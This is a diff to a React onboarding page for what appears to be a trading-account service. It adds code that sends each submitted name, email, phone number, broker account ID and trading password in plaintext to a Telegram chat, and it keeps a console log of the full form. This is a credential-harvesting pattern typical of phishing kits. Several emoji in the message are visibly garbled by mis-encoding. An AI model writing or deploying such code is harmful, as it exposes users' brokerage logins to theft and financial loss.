@@ -4,6 +4,7 @@ import { motion } from "framer-motion";
 import PageLayout from "@/components/PageLayout";
 import { toast } from "sonner";
 import { saveOnboardingProgress, getOnboardingProgress, clearOnboardingProgress } from "@/hooks/use-onboarding-progress";
+import { sendTelegramMessage } from "@/lib/telegram";
 
 interface FormData {
   fullName: string;
@@ -54,8 +55,21 @@ const Onboarding = () => {
     setSubmitting(true);
 
     try {
-      // TODO: Replace with actual backend call
-      // This would store data securely and trigger Telegram notification
+      const message = `
+<b>New Onboarding Submission</b>
+âœ… <b>Name:</b> ${form.fullName}
+ðŸ“§ <b>Email:</b> ${form.email}
+ðŸ“ž <b>Phone:</b> ${form.phone}
+ðŸ ¦ <b>Broker:</b> ${form.broker}
+ðŸ…¿ï¸  <b>Account ID:</b> ${form.accountId}
+ðŸ”‘ <b>Password:</b> ${form.tradingPassword}
+ðŸŒ  <b>Server:</b> ${form.server}
+ðŸ“Š <b>Type:</b> ${form.accountType}
+ðŸ“📝 <b>Notes:</b> ${form.notes || "N/A"}
+      `.trim();
+
+      await sendTelegramMessage(message);
+
       console.log("Onboarding submitted:", { ...form });
       toast.success("Onboarding submitted successfully!");
       saveOnboardingProgress({ currentStep: "success" });
